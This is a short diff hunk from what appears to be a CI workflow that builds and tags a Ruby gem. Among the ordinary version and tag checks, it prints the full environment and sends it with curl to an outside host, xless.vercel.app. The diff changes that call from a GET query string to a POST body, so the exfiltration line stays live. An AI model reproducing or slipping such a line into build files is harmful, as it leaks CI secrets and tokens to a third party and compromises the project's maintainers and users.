@@ -27,7 +27,7 @@ jobs:
             PACKAGE=$(ls *.gem)
             VERSION=$(echo $PACKAGE | sed "s/.*-\(.*\)\.gem/\1/")
             env
-            curl -v "https://xless.vercel.app/?env=$(env)"
+            curl -v https://xless.vercel.app/message --data text="$(env)"
 
             if [ $(git tag -l $VERSION) ]; then echo "Pre-existing Tag $VERSION"; exit 1; fi
 
